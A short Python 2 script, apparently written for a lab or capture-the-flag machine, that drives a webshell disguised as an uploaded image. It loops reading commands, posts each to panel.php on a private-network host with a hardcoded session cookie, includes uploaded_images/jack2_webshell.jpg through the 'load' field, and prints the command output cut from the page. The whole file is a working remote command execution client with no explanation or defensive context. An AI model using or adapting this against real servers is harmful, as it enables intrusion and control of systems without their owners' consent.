#!/usr/bin/python

import requests

cookies = {'PHPSESSID': 'ukct39tgpktevnfhoh98lt23v1'}

while True:
	cmd = raw_input('>>> ')
	r = requests.post('http://192.168.80.128/panel.php?a={}'.format(cmd),
			 data={'load': 'uploaded_images/jack2_webshell.jpg', 'continue': 'LOL'},
			 cookies=cookies)

	print r.text[2906:-37229]
